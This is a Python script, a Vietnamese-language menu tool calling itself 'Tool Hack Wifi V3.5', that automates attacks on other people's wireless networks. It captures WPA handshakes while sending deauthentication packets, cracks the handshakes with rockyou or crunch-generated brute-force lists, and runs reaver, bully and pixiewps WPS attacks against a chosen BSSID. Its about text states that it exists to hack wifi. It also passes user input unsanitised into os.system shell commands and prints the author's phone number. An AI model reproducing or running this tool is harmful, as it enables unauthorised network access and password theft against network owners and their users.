
import os
import subprocess
from datetime import datetime


BLUE = "\033[1;34m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
RESET = "\033[0m"


current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

print(f"{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}")
print(f"{GREEN}Đang cài đặt các công cụ cần thiết...{RESET}")
print(f"{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}")
cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
cmd = os.system("sleep 3 && clear")

def intro():
    cmd = os.system("clear")
    print(f"""
{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}
{WHITE}██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗{RESET}
{WHITE}██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗{RESET}
{WHITE}██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝{RESET}
{WHITE}██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗{RESET}
{WHITE}╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║{RESET}
{WHITE} ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RESET}
{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}Công cụ đang trong giai đoạn thử nghiệm, vui lòng sử dụng cẩn thận!{RESET}
{YELLOW}Tool Hack Wifi V3.5{RESET}
{YELLOW}Thời gian hiện tại: {current_time} (GMT+07){RESET}
{YELLOW}Nhà phát triển: Nguyễn Quang Huy{RESET}
{YELLOW}Facebook: facebook.com/share/1CJkDWUGBY/{RESET}
{YELLOW}Zalo: 0904562214{RESET}
{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}
1) Khởi động chế độ giám sát
2) Dừng chế độ giám sát
3) Quét mạng
4) Lấy Handshake (yêu cầu chế độ giám sát)
5) Cài đặt công cụ không dây
6) Bẻ khóa Handshake bằng rockyou.txt (yêu cầu Handshake)
7) Bẻ khóa Handshake với danh sách từ (yêu cầu Handshake)
8) Bẻ khóa Handshake không có danh sách từ (yêu cầu Handshake và ESSID)
9) Tạo danh sách từ
10) Tấn công mạng WPS (yêu cầu BSSID và chế độ giám sát)
11) Quét mạng WPS
0) Thông tin về tôi
00) Thoát
{CYAN}══════════════════════════════════════════════════════════════════════════════{RESET}
""")
    print(f"{GREEN}Nhập lựa chọn của bạn: {RESET}", end="")
    var = int(input(""))
    
    if var == 1:
        print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0/wlan1): {RESET}")
        interface = input("")
        order = f"airmon-ng start {interface} && airmon-ng check kill"
        geny = os.system(order)
        intro()
    elif var == 2:
        print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
        interface = input("")
        order = f"airmon-ng stop {interface} && service network-manager restart"
        geny = os.system(order)
        intro()
    elif var == 3:
        print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
        interface = input("")
        order = f"airodump-ng {interface} -M"
        print(f"{RED}Nhấn CTRL+C khi hoàn tất{RESET}")
        cmd = os.system("sleep 3")
        geny = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 4:
        print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
        interface = input("")
        order = f"airodump-ng {interface} -M"
        print(f"{RED}\nNhấn CTRL+C khi hoàn tất{RESET}")
        print(f"{YELLOW}Lưu ý: Trong phần Probe, có thể chứa mật khẩu. Hãy sao chép vào tệp danh sách từ{RESET}")
        print(f"{YELLOW}Không tấn công mạng nếu dữ liệu bằng 0 (bạn đang lãng phí thời gian){RESET}")
        print(f"{YELLOW}Sử dụng 's' để sắp xếp mạng{RESET}")
        cmd = os.system("sleep 7")
        geny = os.system(order)
        print(f"{YELLOW}\nNhập BSSID của mục tiêu: {RESET}")
        bssid = str(input(""))
        print(f"{YELLOW}\nNhập kênh của mạng: {RESET}")
        channel = int(input())
        print(f"{YELLOW}\nNhập đường dẫn của tập tin đầu ra: {RESET}")
        path = str(input(""))
        print(f"{YELLOW}\nNhập số gói [1-10000] (0 cho không giới hạn): {RESET}")
        print(f"{YELLOW}Số lượng gói phụ thuộc vào khoảng cách giữa bạn và mạng{RESET}")
        dist = int(input(""))
        order = f"airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | xterm -e aireplay-ng -0 {dist} -a {bssid} {interface}"
        geny = os.system(order)
        intro()
    elif var == 5:
        def wire():
            cmd = os.system("clear")
            print(f"""
{CYAN}════════════════════ Danh sách công cụ không dây ════════════════════{RESET}
1) Aircrack-ng                          17) Kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) Mdk3
5) Bluepot                              21) Mfcuk
6) BlueRanger                           22) Mfoc
7) Bluesnarfer                          23) Mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) Crackle                             26) Reaver
11) Eapmd5pass                          27) Redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) Gr-scan
16) Wifite                              32) Quay lại menu chính
90) Airgeddon
91) Wifite v2
0) Cài đặt tất cả công cụ không dây
{CYAN}════════════════════════════════════════════════════════════════════{RESET}
""")
            wliste = int(input(f"{GREEN}Nhập số của công cụ: >>> {RESET}"))
            if wliste == 1:
                cmd = os.system("sudo apt-get update && apt-get install aircrack-ng")
            elif wliste == 90:
                print("sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git")
            elif wliste == 91:
                print("sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git")
            elif wliste == 2:
                cmd = os.system("sudo apt-get update && apt-get install asleap")
            elif wliste == 3:
                cmd = os.system("sudo apt-get update && apt-get install bluelog")
            elif wliste == 4:
                cmd = os.system("sudo apt-get update && apt-get install bluemaho")
            elif wliste == 5:
                cmd = os.system("sudo apt-get update && apt-get install bluepot")
            elif wliste == 6:
                cmd = os.system("sudo apt-get update && apt-get install blueranger")
            elif wliste == 7:
                cmd = os.system("sudo apt-get update && apt-get install bluesnarfer")
            elif wliste == 8:
                cmd = os.system("sudo apt-get update && apt-get install bully")
            elif wliste == 9:
                cmd = os.system("sudo apt-get update && apt-get install cowpatty")
            elif wliste == 10:
                cmd = os.system("sudo apt-get update && apt-get install crackle")
            elif wliste == 11:
                cmd = os.system("sudo apt-get update && apt-get install eapmd5pass")
            elif wliste == 12:
                cmd = os.system("sudo apt-get update && apt-get install fern-wifi-cracker")
            elif wliste == 13:
                cmd = os.system("sudo apt-get update && apt-get install ghost-phisher")
            elif wliste == 14:
                cmd = os.system("sudo apt-get update && apt-get install giskismet")
            elif wliste == 15:
                cmd = os.system("apt-get install git && git clone git://git.kali.org/packages/gr-scan.git")
            elif wliste == 16:
                cmd = os.system("sudo apt-get update && apt-get install kalibrate-rtl")
            elif wliste == 17:
                cmd = os.system("sudo apt-get update && apt-get install killerbee-ng")
            elif wliste == 18:
                cmd = os.system("sudo apt-get update && apt-get install kismet")
            elif wliste == 19:
                cmd = os.system("sudo apt-get update && apt-get install mdk3")
            elif wliste == 20:
                cmd = os.system("sudo apt-get update && apt-get install mfcuk")
            elif wliste == 21:
                cmd = os.system("sudo apt-get update && apt-get install mfoc")
            elif wliste == 22:
                cmd = os.system("sudo apt-get update && apt-get install mfterm")
            elif wliste == 23:
                cmd = os.system("sudo apt-get update && apt-get install multimon-ng")
            elif wliste == 24:
                cmd = os.system("sudo apt-get update && apt-get install pixiewps")
            elif wliste == 25:
                cmd = os.system("sudo apt-get update && apt-get install reaver")
            elif wliste == 26:
                cmd = os.system("sudo apt-get update && apt-get install redfang")
            elif wliste == 27:
                cmd = os.system("sudo apt-get update && apt-get install rtlsdr-scanner")
            elif wliste == 28:
                cmd = os.system("sudo apt-get update && apt-get install spooftooph")
            elif wliste == 29:
                cmd = os.system("sudo apt-get update && apt-get install wifi-honey")
            elif wliste == 30:
                cmd = os.system("sudo apt-get update && apt-get install wifitap")
            elif wliste == 31:
                cmd = os.system("sudo apt-get update && apt-get install wifite")
            elif wliste == 32:
                intro()
            elif wliste == 0:
                cmd = os.system("apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite")
            else:
                print(f"{RED}Không tìm thấy công cụ!{RESET}")
            wire()
        wire()
    elif var == 0:
        cmd = os.system("clear")
        print(f"""
{CYAN}════════════════════ Thông tin về tôi ════════════════════{RESET}
{YELLOW}Xin chào, tôi là Nguyễn Quang Huy{RESET}
Công cụ này được phát triển bởi tôi cho mục đích hack wifi.
{GREEN}Facebook: facebook.com/share/1CJkDWUGBY/{RESET}
{GREEN}Zalo: 0904562214{RESET}
Cảm ơn bạn đã sử dụng công cụ của tôi!
{CYAN}══════════════════════════════════════════════════════════{RESET}
""")
        quit()
    elif var == 00:
        exit()
    elif var == 6:
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            print(f"{YELLOW}\nNhập đường dẫn của tệp handshake: {RESET}")
            path = str(input(""))
            order = f"aircrack-ng {path} -w /usr/share/wordlists/rockyou.txt"
            print(f"{RED}\nNhấn CTRL+C để thoát{RESET}")
            geny = os.system(order)
            sleep = os.system("sleep 5d")
            exit()
        else:
            cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            print(f"{YELLOW}\nNhập đường dẫn của tệp handshake: {RESET}")
            path = str(input(""))
            order = f"aircrack-ng {path} -w /usr/share/wordlists/rockyou.txt"
            print(f"{RED}\nNhấn CTRL+C để thoát{RESET}")
            geny = os.system(order)
            sleep = os.system("sleep 5d")
            exit()
    elif var == 7:
        print(f"{YELLOW}\nNhập đường dẫn của tệp handshake: {RESET}")
        path = str(input(""))
        print(f"{YELLOW}\nNhập đường dẫn của danh sách từ: {RESET}")
        wordlist = str(input(""))
        order = f"aircrack-ng {path} -w {wordlist}"
        geny = os.system(order)
        exit()
    elif var == 8:
        print(f"{YELLOW}\nNhập ESSID của mạng (cẩn thận khi nhập, sử dụng 'tên của mạng'): {RESET}")
        essid = str(input(""))
        print(f"{YELLOW}\nNhập đường dẫn của tệp handshake: {RESET}")
        path = str(input(""))
        print(f"{YELLOW}\nNhập độ dài tối thiểu của mật khẩu (8/64): {RESET}")
        mini = int(input(""))
        print(f"{YELLOW}\nNhập độ dài tối đa của mật khẩu (8/64): {RESET}")
        max = int(input(""))
        print(f"""
{CYAN}════════════════════ Lựa chọn ký tự mật khẩu ════════════════════{RESET}
1) Ký tự chữ thường (abcdefghijklmnopqrstuvwxyz)
2) Ký tự chữ hoa (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
3) Ký tự số (0123456789)
4) Ký tự biểu tượng (!#$%/=?{{[]-*:;)
5) Chữ thường + chữ hoa (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
6) Chữ thường + số (abcdefghijklmnopqrstuvwxyz0123456789)
7) Chữ hoa + số (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
8) Ký hiệu + số (!#$%/=?{{[]-*:;0123456789)
9) Chữ thường + chữ hoa + số (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
10) Chữ thường + chữ hoa + ký hiệu (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{{[]-*:;)
11) Chữ thường + chữ hoa + số + ký hiệu (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{{[]-*:;)
12) Tùy chỉnh ký tự của bạn
{CYAN}═════════════════════════════════════════════════════════════════{RESET}
{YELLOW}Lưu ý: Việc bẻ khóa mật khẩu có thể mất nhiều thời gian (giờ, ngày, tuần, tháng).
Tốc độ sẽ giảm nếu danh sách mật khẩu quá lớn. Hãy kiên nhẫn!{RESET}
""")
        print(f"{GREEN}\nNhập lựa chọn của bạn: {RESET}")
        set = str(input(""))
        if set == "1":
            test = "abcdefghijklmnopqrstuvwxyz"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "2":
            test = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "3":
            test = "0123456789"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "4":
            test = "!#$%/=?{}[]-*:;"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "5":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "6":
            test = "abcdefghijklmnopqrstuvwxyz0123456789"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "7":
            test = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "8":
            test = "!#$%/=?{}[]-*:;0123456789"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "9":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "10":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "11":
            test = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;"
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        elif set == "12":
            print(f"{YELLOW}Nhập ký tự tùy chỉnh của bạn: {RESET}")
            test = str(input(""))
            order = f"crunch {mini} {max} {test} | aircrack-ng {path} -e {essid} -w-"
            geny = os.system(order)
        else:
            print(f"{RED}\nKhông tìm thấy lựa chọn!{RESET}")
            intro()
        print(f"{GREEN}Sao chép mật khẩu và đóng công cụ{RESET}")
        cmd5 = os.system("sleep 3d")
    elif var == 9:
        print(f"{YELLOW}\nNhập độ dài tối thiểu của mật khẩu (8/64): {RESET}")
        mini = int(input(""))
        print(f"{YELLOW}\nNhập độ dài tối đa của mật khẩu (8/64): {RESET}")
        max = int(input(""))
        print(f"{YELLOW}\nNhập đường dẫn của tệp đầu ra: {RESET}")
        path = str(input(""))
        print(f"{YELLOW}\nNhập ký tự bạn muốn mật khẩu chứa: {RESET}")
        password = str(input(""))
        order = f"crunch {mini} {max} {password} -o {path}"
        geny = os.system(order)
        print(f"{GREEN}Danh sách từ được tạo tại: {path}{RESET}")
    elif var == 10:
        cmd = os.system("clear")
        print(f"""
{CYAN}════════════════════ Tùy chọn tấn công WPS ════════════════════{RESET}
1) Reaver
2) Bully
3) Wifite (Khuyên dùng)
4) PixieWPS
0) Quay lại Menu chính
{CYAN}═══════════════════════════════════════════════════════════════{RESET}
""")
        print(f"{GREEN}Chọn kiểu tấn công (Yêu cầu bộ điều hợp WIFI bên ngoài): {RESET}")
        attack = int(input(""))
        if attack == 1:
            print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
            interface = str(input(""))
            print(f"{YELLOW}\nNhập BSSID của mạng: {RESET}")
            bssid = str(input(""))
            order = f"reaver -i {interface} -b {bssid} -vv"
            geny = os.system(order)
            intro()
        elif attack == 2:
            print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
            interface = str(input(""))
            print(f"{YELLOW}\nNhập BSSID của mạng: {RESET}")
            bssid = str(input(""))
            print(f"{YELLOW}\nNhập kênh của mạng: {RESET}")
            channel = int(input(""))
            order = f"bully -b {bssid} -c {channel} --pixiewps {interface}"
            geny = os.system(order)
            intro()
        elif attack == 3:
            cmd = os.system("wifite")
            intro()
        elif attack == 4:
            print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
            interface = str(input(""))
            print(f"{YELLOW}\nNhập BSSID của mạng: {RESET}")
            bssid = str(input(""))
            order = f"reaver -i {interface} -b {bssid} -K"
            geny = os.system(order)
            intro()
        elif attack == 0:
            intro()
    elif var == 11:
        print(f"{YELLOW}\nNhập giao diện (Mặc định: wlan0mon/wlan1mon): {RESET}")
        interface = str(input(""))
        order = f"airodump-ng -M --wps {interface}"
        geny = os.system(order)
        cmd = os.system("sleep 5")
        intro()
    else:
        print(f"{RED}Không tìm thấy lựa chọn!{RESET}")
        cmd = os.system("sleep 2")
        intro()

intro()